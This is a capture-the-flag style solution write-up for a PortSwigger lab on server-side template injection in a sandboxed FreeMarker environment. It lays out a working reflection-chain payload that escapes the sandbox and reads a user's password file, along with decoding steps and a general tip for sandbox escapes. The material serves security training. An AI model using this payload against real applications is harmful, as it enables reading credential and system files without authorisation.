# Lab 06 — Server-side template injection in a sandboxed environment

> **Expert** · [Official lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

**Entry point:** product description template · **Engine:** FreeMarker with
a sandbox blocking dangerous classes · **Goal:** read Carlos's password file.

## Solution

1. The sandbox blocks `?new()` and known utility classes — but every object
   inherits `java.lang.Object`. Probe with the Object-method chain:

```
${object.getClass()}
```

→ works: `getClass()` breaches the sandbox.

2. Chain from the `product` object to a file reader (JavaDoc is your map:
   `getClass` → `getProtectionDomain` → `getCodeSource` → `getLocation` →
   `URI.resolve` → `toURL` → `openStream` → `readAllBytes`):

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

3. Save, view the product page — the file is returned as **decimal ASCII
   codes** (the editor limits expressions to 125 chars; split the chain across
   two concatenated segments if needed).
4. Decode the decimals to ASCII — that string is the solution — lab solved.

## Notes

Sandbox escapes usually mean "the block-list missed *some* method reachable
from any object". `getClass()` is the universal first hop.
